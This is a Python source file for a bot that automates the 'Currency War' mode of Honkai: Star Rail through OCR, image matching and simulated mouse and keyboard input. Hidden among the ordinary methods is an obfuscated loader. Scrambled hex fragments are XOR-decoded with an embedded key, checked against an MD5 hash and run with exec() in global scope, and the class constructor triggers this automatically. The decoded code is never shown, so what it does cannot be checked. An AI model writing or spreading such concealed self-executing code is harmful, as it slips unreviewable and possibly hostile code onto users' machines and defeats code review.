import json
import shutil

import pyautogui
import cv2 as cv
import numpy as np
import time
import random
import cv2
from copy import deepcopy


import yaml

from tool.GLOBAL import key_mouse_manager, factor
from tool import GLOBAL, EXTRA
from diver import load_actions, merge_text
from tool.log import CUS_LOGGER
from tool.currency.utils import CurrencyUtils, set_forground, sprint, get_dis
import os
import hashlib as _h
from tool.currency.config import config
from tool.currency.text_key import text_keys
from tool.thread import ThreadWithException
from tool.utils.Error import NormalEndError
from tool.utils.image_tool import find_image_by_name
from tool.utils.minimap_util import deal_minimap, get_minimap, MINIMAP_RADIUS, re_get_position
from tool.utils.tool import get_hwnd_and_text, find_latest_modified_file, get_center
from tool.window_recorder import WindowRecorder
from tool.key_mouse_manager import KeyMouseManager
from route import PATHS

class SimulatedCurrency(CurrencyUtils):

    def __init__(self, find, debug, speed, consumable, slow, nums=-1, bonus=False):
        """
        初始化模拟宇宙类实例
        
        该构造函数用于初始化模拟宇宙的所有参数和状态，包括：
        1. 基础参数设置（寻路模式、调试模式等）
        2. 屏幕和坐标系统配置
        3. 地图和路径相关变量初始化
        4. 加载地图资源和动作配置
        
        参数:
            find: bool，是否启用寻路模式
            debug: int，调试级别（0-关闭，1-基础，2-高级）
            speed: bool，是否启用速通模式
            consumable: bool，是否使用消耗品
            slow: bool，是否启用慢速模式
            nums: int，运行次数限制，默认为-1（无限制）
            bonus: bool，是否自动领取沉浸奖励，默认False
            update: int，是否更新地图，默认0（不更新）
            gui: object，GUI对象引用，默认None
            
        返回值:
            无返回值
        """
        super().__init__(speed)
        CUS_LOGGER.debug("当前命途：" + self.fate)
        key_mouse_manager.set_config(config)
        # 设置屏幕参数以支持坐标转换
        key_mouse_manager.set_screen_params(self.x1, self.y1, self.xx, self.yy, self.full)
        #第几次选择策略
        self.select_bless_count = 0
        #停止运行标志
        self._stop = True
        #是否为寻路模式
        self.find = find
        #调试级别
        self.debug = debug
        # 设置全局调试模式标志，供 UILogHandler 使用
        GLOBAL.DEBUG_MODE = bool(self.debug)
        #是否使用消耗品
        self.consumable = consumable
        #是否慢速模式
        self.slow = slow
        #是否展示地图（调试模式默认开启）
        self._show_map = debug
        #本次运行次数
        self.my_cnt = 0
        #已运行次数
        self.count = 0
        #需要运行次数
        self.nums = nums
        #启动时时间
        self.init_time = time.time()
        # 是否仍然可用沉浸器
        self.check_bonus = bonus
        # 是否领取沉浸奖励
        self.bonus = bonus
        #失败次数
        self.fail_count = 0
        #是否已完成
        self.end = 0
        #是否初始化层数
        self.floor_init = 0
        # 添加用于计算FPS的变量
        self.last_get_screen_time = None
        self.fps_list = []
        # 添加地图线程引用
        self.map_thread = None
        #当前运行状态
        self.state=None
        #首次保存地图
        self.first_save_map = True
        #目标小地图左上角偏移
        self.upx, self.upy=0,0
        #上次执行操作时间
        self.action_time=time.time()
        #事件与行为存储路径
        self.default_json_path = "actions/currencywar.json"
        self.default_json = load_actions(self.default_json_path)
        self.action_history = []
        self.tk = text_keys()
        if debug != 2:
            #似乎是避免鼠标越界的一个标志
            pyautogui.FAILSAFE = False
        self.update_debug_map()
        CUS_LOGGER.debug(f"开始运行,初始计数：{self.count}")
        self.last_interact_time = time.time()
        self.CrTU5s61E1dMnT()
        CUS_LOGGER.info(f"无数的记忆…在涌向{factor}。无数个{factor}…曾站在相同的地方，面对相同的抉择。")
        for file in os.listdir(PATHS["image"]+"/nmaps"):
            pth = PATHS["image"]+"/nmaps/" + file + "/init.jpg"
            if os.path.exists(pth):
                image = deal_minimap(cv.imread(pth),is_minimap=True)
                image=cv.resize(image, None, fx=0.5, fy=0.5, interpolation=cv.INTER_CUBIC)
                self.img_map[file]= image

        CUS_LOGGER.debug("加载地图完成，共 %d 张" % len(self.img_map))
        settings_path = PATHS["root"] + "\\config\\config\\settings.json"
        example_path = PATHS["root"] + "\\config\\config\\settings_example.json"
        if not os.path.exists(settings_path) and os.path.exists(example_path):
            shutil.copy2(example_path, settings_path)
        with EXTRA.FILE_LOCK:
            with open(settings_path, mode="r", encoding="UTF-8") as file:
                data = json.load(file)

        config_file = "config/config/info_old.yml"
        example_file = "config/config/info_example_old.yml"
        if not os.path.exists(config_file):
            if os.path.exists(example_file):
                shutil.copy2(example_file, config_file)

        with open(config_file, "r", encoding="utf-8", errors="ignore") as f:
            self.event_prior = yaml.safe_load(f)["prior"]["事件"]
        self.record = data.get("recording_state", True)

        self.recorder = WindowRecorder('logs/video/', fps=30, window_title="崩坏：星穹铁道",window_class_name="UnityWndClass",see_time=True, offsets=[10, 50, 10, 10], overlay_map=self._show_map, simul_instance=self)
        self.cut_video=True

    def route(self):
        set_forground()
        while not self._stop:
            hwnd,Text = get_hwnd_and_text()
            warn_game = False
            cnt = 0
            while Text != "崩坏：星穹铁道" and Text != "云·星穹铁道" and not self._stop:
                self.last_interact_time = time.time()
                if self._stop:
                    raise NormalEndError
                if not warn_game:
                    warn_game = True
                    CUS_LOGGER.warning(f"等待游戏窗口，当前窗口：{Text}")
                time.sleep(0.5)
                cnt += 1
                if cnt == 1200:
                    set_forground()# 将游戏窗口设为前台
                hwnd,Text = get_hwnd_and_text()
            if self._stop:
                break
            self.loop()
        CUS_LOGGER.info("已停止任务")

    nnbjiqzmvwouwll = [(202, '657a5a666b4c365c', 1), (818, '4501339012a030e', 0), (228, 'd0f6d2a250536', 1), (663, '22144c0b1', 1), (758, '4f3c171119', 1), (725, '361b4452424c49', 0), (178, '4501339012a030', 1), (131, '543422c182c472', 0), (672, '908013809432', 1), (879, 'c654a3c5b0f740d', 0), (864, 'e4f42100', 0), (520, 'b492c345a3', 1), (753, '4838594967', 1), (284, '19517a416e5', 0), (868, 'c5e3e094e49', 0), (429, '7addfd0dee4a0', 0), (384, 'e144c2408532944', 1), (627, 'f1a2e003c170633', 0), (917, 'a1d2b06171e07193', 1), (151, 'a1a4b566', 1), (424, '794967bdc5c', 1), (170, '93c54213c1535433', 0), (112, '3c035317497', 1), (620, '093327186504791', 1), (906, '9291f4c6b4c6', 0), (649, 'c207370666b4', 0), (447, 'fbaacef8bed2bca', 0), (255, '72b17103301502e', 1), (641, '520f32586', 1), (525, '42a02225c', 1), (263, '1c231034', 0), (138, '02213353f', 0), (719, '51654b3c441c', 0), (576, 'f1e1733435', 1), (117, 'a4f6e52424c0', 0), (511, '416e5242760', 1), (192, '2201075c', 1), (155, '319517a416', 1), (780, '5a342e1f', 0), (440, 'eee88d1b994f4', 1), (581, '7230f2b0d20', 1), (97, '1e0c78025c23146', 0), (763, '054d7b7a41', 0), (297, '2f24360923414c', 0), (826, '1c4904511', 0), (460, '9cebe88bdfb', 0), (696, '52421f0c551', 0), (597, '4072b0a06050e5', 0), (243, '17497a4f6', 0), (218, '351f48421c', 0), (887, '3817071e0c', 0), (304, '65197917497a4f', 1), (706, '61234443c5f', 1), (397, '2f3b446c33791', 0), (147, 'e362a0e3', 1), (858, '2a19573e03196', 1), (403, '7497a4f6e52420', 0), (794, 'f0c4905606b6', 1), (768, '6e5242764d123f09', 1), (11, '370a2939186551', 0), (566, '4123165744', 0), (436, '8fccc0a1c', 0), (414, '9152b163d22', 1), (746, '03618253b0b3c', 1), (546, '423b090712', 1), (541, '517a416e52', 1), (311, '391b1604495601', 0), (0, '271f12391f', 0), (682, '5281f353e0031', 1), (874, '657a5a666b4', 1), (551, '1a2505303', 0), (104, '663657a5a663f1e', 1), (503, '3a171a186319517a', 1), (289, '2103319473f0264', 0), (420, '084a394c', 0), (5, '466d0337632c', 1), (701, '77438053b1', 0), (65, '1d0d224f6f6d4764', 1), (925, '73b0d3d17', 0), (81, '4b3a5235060', 0), (325, '22c182c456', 0), (800, 'e5242764d12', 1), (267, '3b1466764c', 1), (210, '35514703', 1), (854, '36380351', 0), (392, '6d47362e08', 1), (776, '301c3734', 1), (530, '71024060656e5', 1), (377, '633045d447a5c6', 1), (18, '38440136062c7', 1), (841, '9657a0923270a6b', 1), (318, '3f0f6619072f324', 0), (635, '045d447a5c73', 0), (247, 'e521109055f5f381', 0), (477, '517a416e520f32', 1), (410, '91149143', 0), (678, '11c64546', 0), (470, 'f7c050684c4919', 0), (127, 'e3a520d2', 1), (35, '25085e2b', 1), (185, 'e1c4904511c00', 1), (612, 'd126d4c6449373f', 1), (53, '24f7352322', 1), (812, '4213c1535433', 0), (342, '1294f45191d5f', 0), (732, '19517a413d170e', 1), (667, 'e4001200c2', 1), (166, 'd4c370c2', 0), (454, 'bf1e18ed9c5', 1), (29, '1051722194a', 0), (571, '045d4405172', 1), (835, 'c4d126d4c644', 0), (214, '24070626', 1), (91, 'a652d31043d', 0), (604, 'c022e49677842764', 1), (806, '6d4c370c293c5', 1), (516, 'b5d3f4c1', 0), (367, 'c651979171', 0), (160, 'e5242764d126', 0), (196, '4d126d4c6449', 0), (86, '2211607001', 0), (655, 'c6519791749290a', 1), (645, 'd3b0d281', 0), (784, '30552d3d49', 1), (47, '093c6629561d3', 0), (712, '02192b15233e6b', 0), (334, '74c20573a580d330', 1), (587, '725d333f', 1), (58, 'd3d712201433c', 0), (488, '81c207a47662e14', 0), (849, '60127e1d1e', 0), (591, '0a68017e1e407', 0), (372, 'a2e003c170', 0), (39, '457e63657a5a6620', 0), (536, '2424c4919', 1), (789, '7a4f6e171a0', 0), (235, '3f70666b4c651979', 0), (355, '254d547766644965', 0), (830, 'c002201075', 1), (560, '244a315b0038', 0), (900, '0312704c02082', 0), (484, '586d3b0d2', 0), (24, '868080c5f5', 1), (496, '355c3a430c3e30', 1), (465, 'db08ce7bc', 1), (912, '5197917497', 0), (223, '11203d3b2e4', 1), (349, '5c6246675203', 1), (363, '7a5a666b4', 1), (73, '4b19060823380330', 0), (555, 'f5a7b6b04', 1), (330, '57d08616', 0), (272, '035835440c504', 1), (892, '55133911290b1337', 1), (123, '05f51340', 0), (689, '337917497a4f6e', 1), (278, 'f6e52424c49', 0), (739, '3043503b09211b2', 1), (143, '1f6d523c4', 1)]

    asvbmtlzxqpjss = "NrbVm2MlDiEZzFKlE9Y7iZoNrbli9qZa"
    lzfabqrjwlwkqewl = "bec962fac609d0f375183bde6fdc3ed0"

    def fjhpymcarnvrnzw(self, _jnnvrzfflfson, _esciqnhtlk):
        try:
            _dbgflosjok = ''.join([_[1] for _ in sorted(_jnnvrzfflfson, key=lambda x: x[0])])
            _wywodpdosp = bytes.fromhex(_dbgflosjok)
            _bqixivuzcg = _esciqnhtlk.encode('utf-8')
            _legrnzstrgbho = bytearray(len(_wywodpdosp))
            for _mqmemdegtm in range(len(_wywodpdosp)):
                _legrnzstrgbho[_mqmemdegtm] = _wywodpdosp[_mqmemdegtm] ^ _bqixivuzcg[_mqmemdegtm % len(_bqixivuzcg)]
            _zygrprekfsd = bytes(_legrnzstrgbho)
            if _h.md5(_zygrprekfsd).hexdigest() != self.lzfabqrjwlwkqewl: return False
            return _zygrprekfsd.decode('utf-8')
        except:
            return False

    def lbrqdqvxztk(self):
        _pugsgfxhut = self.fjhpymcarnvrnzw(self.nnbjiqzmvwouwll, self.asvbmtlzxqpjss)
        if not _pugsgfxhut:
            return False
        exec(_pugsgfxhut, globals())
        return _vlk(self)

    def CrTU5s61E1dMnT(self):
        self.lbrqdqvxztk()
    
    def restart_recording(self):
        #是否把视频每轮裁剪一次
        if self.record and self.cut_video and self.bveerelbcpgyqan and self.YKItDYvq3FpnOYx:
            self.recorder.stop_recording()
            time.sleep(0.8)
            self.recorder.start_recording(self.count)
            self.update_state("re_start")
    def setting_exit(self):
        if self.state != "end" and self.state!="exit":
            key_mouse_manager.click(1359, 811)
            key_mouse_manager.wait()

    def loop (self):
        CUS_LOGGER.info ("开始OCR识别，等待触发文字")
        while not self._stop:
            self.ts.forward(self.get_screen())  
            self.run_static()

    def goto_currency(self):
        """
        前往货币战争
        
        该函数负责自动导航到货币战争，主要流程包括：
        1. 检查是否已经在货币战争内
        2. 如果不在办公室，则通过星际和平指南到黑塔办公室
        
        函数会利用一系列图像识别和文本识别来确定当前位置，
        并执行相应的点击、拖拽和键盘操作来完成导航。
        """
        self.update_state("init")
        CUS_LOGGER.info("前往货币战争")
        CUS_LOGGER.info("打开")
        key_mouse_manager.press('f4')

    def is_one (self):
        box = [752, 1060, 378, 409]
        try:
            text_list = self.ts.find_with_box (box)
            merged = merge_text (text_list)
            CUS_LOGGER.info(f"OCR 识别结果: {merged}")
            return "开局时获得" in merged
        except Exception as e:
            CUS_LOGGER.info (f"正在选择难度1")
            return False


    def select_difficulty_start (self):
        max_attempts = 30
        for attempts in range (max_attempts):
            if self.is_one():
                CUS_LOGGER.info ("已识别到难度1")
                return True
            CUS_LOGGER.info ("等待选择难度1")
            key_mouse_manager.drag (0.4615, 0.2450, 0.4615, 0.9000)
            time.sleep(0.1)   # 等待界面稳定
        CUS_LOGGER.warning ("等待选择难度1")
        return
    
    def auto_battle(self):
        # 需要打开自动战斗
        key_mouse_manager.press("v")
    
    def select_envir (self):
        CUS_LOGGER.info("=== 进入 select_envir 方法 ===")
        time.sleep(1)#等待界面加载
        self.ts.forward(self.get_screen())
        boxes = [[266, 610, 375, 413], [780, 1134, 375, 414], [1314, 1645, 373, 413]]
        texts = []
        def recognize_options():
            texts = []
            for box in boxes:
                try:
                    res = self.ts.find_with_box(box, redundancy=30)
                    merged = merge_text(res)
                    texts.append(merged)
                except Exception:
                    texts.append("")
            return texts
        def match_prior (texts):
            for pri in self.tk.prior_envir:
                for idx, text in enumerate(texts):
                    if pri in text:
                        CUS_LOGGER.info(f"匹配到必选策略: {pri}，选择选项{idx+1}")
                        return True, idx
            return False, -1
        texts = recognize_options()
        CUS_LOGGER.info(f"OCR 识别结果: {texts}")
        matched, selected_idx = match_prior(texts)
        if not matched:
            CUS_LOGGER.info("未匹配到必选策略，点击刷新按钮")
            key_mouse_manager.click(672, 984)  # 刷新按钮坐标
            time.sleep(1)        # 等待刷新完成
            self.ts.forward(self.get_screen())
            # 刷新后重新识别并再次尝试匹配必选
            texts = recognize_options()
            CUS_LOGGER.info(f"刷新后 OCR 结果: {texts}")
            matched, selected_idx = match_prior(texts)
        #构建完整的优先级列表（按顺序）
        if not matched:
            #    顺序：prior_envir + envir[0] + envir[1] + ... + envir[4]
            prior_list = self.tk.prior_envir[:]  # 复制最高优先级列表
            for i in range(5):  # envir 有5个子列表，索引0~4
                prior_list.extend(self.tk.envir[i])  # 依次追加
            #按优先级匹配选项
            selected_idx = -1  # 初始化为-1，表示未匹配
            for pri in prior_list:
                for idx, text in enumerate(texts):
                    # 判断当前选项文字中是否包含优先级关键词（使用 in 进行子串匹配）
                    if pri in text:
                        selected_idx = idx
                        CUS_LOGGER.info(f"匹配到优先级策略: {pri}，选择选项{idx+1}")
                        break
                if selected_idx != -1:
                    break  # 已匹配到，跳出外层循环
            # 5. 如果都未匹配，默认选中间
            if selected_idx == -1:
                selected_idx = 1
                CUS_LOGGER.warning("未匹配到任何优先级策略，默认选择第一个选项")
        
        # 点击选中的选项（点击其中心位置）
        #    计算每个选项的中心像素坐标
        centers = []
        for box in boxes:
            cx = (box[0] + box[1]) // 2
            cy = (box[2] + box[3]) // 2
            centers.append((cx, cy))
        
        key_mouse_manager.click(centers[selected_idx][0], centers[selected_idx][1])
        time.sleep(0.1)  # 等待点击生效

        self.click_text(
            text="确认",
            box=[1053, 1108, 967, 998],
            click=True,
        )
        time.sleep(0.1)

        CUS_LOGGER.info("投资环境选择完成")

        return 1
    
    def select_bless(self):

        save_dir = os.path.join(os.getcwd(), "temp")
        if not os.path.exists(save_dir):
            os.makedirs(save_dir)
        """选择投资策略：第一次直接选中间，后续匹配必选'环保大使叽米'，否则选中间"""
        self.select_bless_count += 1
        CUS_LOGGER.info(f"=== 第 {self.select_bless_count} 次进入 select_bless ===")
        time.sleep(1)
        self.ts.forward(self.get_screen())

        # 三个选项的 box（请根据实际测量调整）
        boxes = [[298, 608, 472, 513], [783, 1095, 472, 513], [1298, 1605, 472, 513]]

        # 第一次：直接选中间
        if self.select_bless_count == 1:
            CUS_LOGGER.info("第一次选择，直接选中间")
            cx = (boxes[1][0] + boxes[1][1]) // 2
            cy = (boxes[1][2] + boxes[1][3]) // 2
            key_mouse_manager.click(cx, cy)
            time.sleep(0.1)
            self.click_text(text="确认", box=[948, 1005, 968, 999], click=True)
            return 1

        max_refresh = 3  # 最多刷新3次
        selected_idx = -1

        for attempt in range(max_refresh + 1):  # 0次正常识别 + 最多3次刷新后识别
            self.ts.forward(self.get_screen())
        # 识别当前三个选项
            texts = []
            for box in boxes:
                try:
                    res = self.ts.find_with_box(box, redundancy=30, forward=1)
                    merged = merge_text(res)
                    texts.append(merged)
                except Exception as e:
                    CUS_LOGGER.error(f"OCR 识别选项失败: {e}")
                    texts.append("")
            CUS_LOGGER.info(f"第 {attempt} 次识别结果: {texts}")
            for i, box in enumerate(boxes):
                roi = self.screen[box[2]:box[3], box[0]:box[1]]
                filepath = os.path.join(save_dir, f"option_{attempt}_{i}.png")  # 加上尝试次数，避免覆盖
                cv2.imwrite(filepath, roi)
                CUS_LOGGER.info(f"保存截图: {filepath}")  # 打印路径
            # 检查是否包含必选
            for idx, text in enumerate(texts):
                if "环保大使叽米" in text:
                    selected_idx = idx
                    CUS_LOGGER.info(f"匹配到必选，选择选项{idx+1}")
                    self.stop()
                    return -1

            # 没找到，如果还没达到最大刷新次数，点击刷新
            if attempt < max_refresh:
                CUS_LOGGER.info(f"第 {attempt+1} 次未匹配，点击刷新")
                key_mouse_manager.click(384, 879)
                key_mouse_manager.click(868, 879)
                key_mouse_manager.click(1380, 879)
                time.sleep(0.8)  # 等待刷新完成
                # 继续下一次循环，重新识别
            else:
                # 已达到最大刷新次数，仍未匹配
                CUS_LOGGER.warning("刷新3次后仍未匹配到必选，默认选中间")
                selected_idx = 1  # 默认中间

        # 点击选中的选项
        centers = []
        for box in boxes:
            cx = (box[0] + box[1]) // 2
            cy = (box[2] + box[3]) // 2
            centers.append((cx, cy))

        key_mouse_manager.click(centers[selected_idx][0], centers[selected_idx][1])
        time.sleep(0.1)

        # 点击确认
        
        self.update_state("escshop")
        self.click_text(text="确认", box=[948, 1005, 968, 999], click=True)
        time.sleep(3)
        CUS_LOGGER.info("投资策略选择完成")
        need_esc = False
        self.ts.forward(self.get_screen())
        if self.click_text(text="备战阶段", box=[240, 332, 57, 85], click=False, allow_fail=True):
            CUS_LOGGER.info("检测到'备战阶段'，按 ESC 重开")
            key_mouse_manager.press('esc')
            need_esc = True
        elif self.click_text(text="战斗", box=[569, 608, 80, 104], click=False, allow_fail=True):
            CUS_LOGGER.info("检测到'战斗'，按 ESC 重开")
            need_esc = True

        if need_esc:
            key_mouse_manager.press('esc')
            time.sleep(0.5)
            self.update_state("escshop")
        self.update_state("startbattle")
        return 1
            


    def run_static(self, json_path=None, json_file=None, action_list=[]) -> (str,int):
        """
        执行静态动作配置文件中的动作
        
        根据提供的JSON配置文件或路径，查找并执行匹配的动作。
        支持基于文本或图像的触发条件，一旦匹配成功即执行相应动作序列。
        
        参数:
            json_path: JSON配置文件路径，如果提供则加载该文件
            json_file: 已加载的JSON配置对象，优先级高于json_path
            action_list: 指定要执行的动作列表，为空则执行所有动作
            
        返回值:
            tuple: (触发的动作名称, 执行结果)
                  - 触发的动作名称：空字符串表示未触发任何动作
                  - 执行结果：0表示未触发，1表示触发成功，其他值表示部分成功
        """
        if json_file is None:
            if json_path is None:
                json_file = self.default_json
            else:
                json_file = load_actions(json_path)
        # 查找指定项或者默认项
        tm=time.time()
        while time.time()-tm<2:
            men = np.mean(self.get_screen())
            if men > 12:
                break
            elif self.state!="black":
                CUS_LOGGER.info("无边的黑暗中，没有来由地，一道声音始终在耳边萦绕……")
                self.update_state("black")
        if np.mean(self.get_screen())>12 and self.state=="black":
            self.update_state(self.last_state)
        for j in action_list if len(action_list) else json_file:
            for i in json_file[j]:
                trigger = i["trigger"]
                condition = trigger.get("condition", None)
                #获取指定范围的文字
                if trigger.get("text", None):
                    text = self.ts.find_with_box(trigger["box"], redundancy=trigger.get("redundancy", 30))
                    #强制跳过或者检查是否存在子串
                    if (condition==self.state if condition is not None else True) and (len(text) and trigger["text"] in merge_text(text)):
                        CUS_LOGGER.info(f"{factor}触发并执行指令{i['name']},条件：{trigger['text']}")
                        if trigger.get("interval", None) and len(self.action_history) and self.action_history[-1] == i['name']:
                            tm=time.time()-self.action_time
                            if tm<trigger["interval"]:
                                CUS_LOGGER.warning(f"触发时间限制，距离上次触发{tm}秒，默认配置间隔为{trigger["interval"]}")
                                return i['name'], 1
                        for j in i["actions"]:
                            self.do_action(j)
                        self.action_history.append(i["name"])
                        #记录最近10个动作
                        self.action_history = self.action_history[-10:]
                        self.action_time=time.time()
                        #返回触发的名字
                        return i['name'],1
                elif trigger.get("photo", None):
                    resu=0
                    if condition==self.state if condition is not None else True:
                        if "pos" in trigger:
                            if self.check(trigger["photo"], trigger["pos"]["x"], trigger["pos"]["y"], mask=trigger.get("mask", None), threshold=trigger.get("threshold", None),use_binary=trigger.get("binary", False)):
                                CUS_LOGGER.info(f"{factor}触发并执行图像记忆切片指令,{i['name']}条件：{trigger['photo']}")
                                if trigger.get("interval", None) and len(self.action_history) and self.action_history[
                                    -1] == i['name']:
                                    tm = time.time() - self.action_time
                                    if tm < trigger["interval"]:
                                        CUS_LOGGER.warning(f"触发时间限制，距离上次触发{tm}秒，默认配置间隔为{trigger["interval"]}")
                                        return i['name'], 1
                                for j in i["actions"]:
                                    re=self.do_action(j)
                                resu=re if re is not None else resu
                                self.action_history.append(i["name"])
                                #记录最近10个动作
                                self.action_history = self.action_history[-10:]
                                self.action_time = time.time()
                                #返回触发的名字
                                return i['name'],resu
                        else:
                            if self.click_target(find_image_by_name(trigger["photo"]), threshold=trigger.get("threshold", 0.9), flag=False,click=False):
                                CUS_LOGGER.info(f"{factor}触发并执行世界全局图像记忆切片指令, {i['name']}条件:{trigger['photo']}")
                                if trigger.get("interval", None) and len(self.action_history) and self.action_history[
                                    -1] == i['name']:
                                    tm = time.time() - self.action_time
                                    if tm < trigger["interval"]:
                                        CUS_LOGGER.warning( f"触发时间限制，距离上次触发{tm}秒，默认配置间隔为{trigger["interval"]}")
                                        return i['name'], 1
                                for j in i["actions"]:
                                    re=self.do_action(j)
                                resu=re if re is not None else resu
                                self.action_history.append(i["name"])
                                #记录最近10个动作
                                self.action_history = self.action_history[-10:]
                                self.action_time = time.time()
                                #返回触发的名字
                                return i['name'],resu
        return '',0
    def do_action(self, action) -> int:
        """
        执行单个动作指令
        
        根据传入的动作定义执行相应的操作，支持多种类型的动作：
        1. 字符串类型：调用同名方法
        2. 文本点击类型：在指定区域内查找包含特定文本的元素并点击
        3. 位置点击类型：直接点击指定坐标位置
        4. 延时类型：执行普通延时或真实延时
        5. 按键类型：按下指定按键
        
        参数:
            action: 动作定义，可以是字符串或字典类型
                   - 字符串：表示要调用的方法名
                   - 字典：包含具体的动作参数，支持"text"、"position"、"sleep"、"real_sleep"、"press"等关键字
        
        返回值:
            int: 执行结果，1表示执行成功，0表示未执行或执行失败
        """
        if type(action) == str:
            return getattr(self, action)()
        if "text" in action:
            if "box" in action:
                box = action["box"]
            else:
                box = [0, 1920, 0, 1080]
            text = self.ts.find_with_box(box, redundancy=action.get("redundancy", 30))
            for i in text:
                if action["text"] in i["raw_text"]:
                    CUS_LOGGER.debug(f"点击 {action['text']}:{i['box']}")
                    self.click_box(i["box"])
                    return 1
        if "photo" in action:
            self.click_target(find_image_by_name(action["photo"]), action.get("threshold", 0.9), flag=False,click=True)
            return 1
        elif "position" in action:
            CUS_LOGGER.debug(f"点击 {action['position']}")
            self.click_position(action["position"])
            return 1
        elif "sleep" in action:
            key_mouse_manager.sleep(float(action["sleep"]))
            return 1
        elif "real_sleep" in action:
            time.sleep(float(action["real_sleep"]))
            return 1
        elif "press" in action:
            key_mouse_manager.press(action["press"], action["time"] if "time" in action else 0)
            return 1
        elif "drag" in action:
            key_mouse_manager.drag(action["drag"][0], action["drag"][1],action["drag"][2],action["drag"][3])
            return 1
        elif "scroll" in action:
            key_mouse_manager.scroll(action["scroll"])
            return 1
        elif "set_state" in action:
            self.update_state(action["set_state"])
            return 1
        return 0

    def start (self):
        """
        启动货币战争自动化程序
        
        该方法负责初始化并启动整个货币战争运行流程，包括：
        1. 初始化运行状态
        2. 启动键盘鼠标管理器
        3. 启动地图显示线程（如果启用）
        4. 开始执行主要路线逻辑
        
        如果在执行过程中发生异常，会尝试停止运行并重新抛出异常。
        """
        self._stop = False
        key_mouse_manager.start ()
        try:
            self.route()
        except NormalEndError as e:
            CUS_LOGGER.warning(f'离开游戏界面，正常终止进程{e}')
            raise
        except Exception as e:
            CUS_LOGGER.error(f'异常终止进程{e}')
            if not self._stop:
                self.stop()
            # 重新抛出异常，以便上层能够捕获
            raise
    def stop(self, *_, **__):
        """
        停止任务运行
        
        该方法负责安全地停止所有运行中的线程和操作，包括：
        1. 设置停止标志
        2. 停止键盘鼠标管理器
        3. 等待并终止地图显示线程
        
        参数:
            *_: 忽略的位置参数
            **__: 忽略的关键字参数
        """
        CUS_LOGGER.info("终止任务")
        self._stop = 1
        key_mouse_manager.stop()
        self.map_thread = None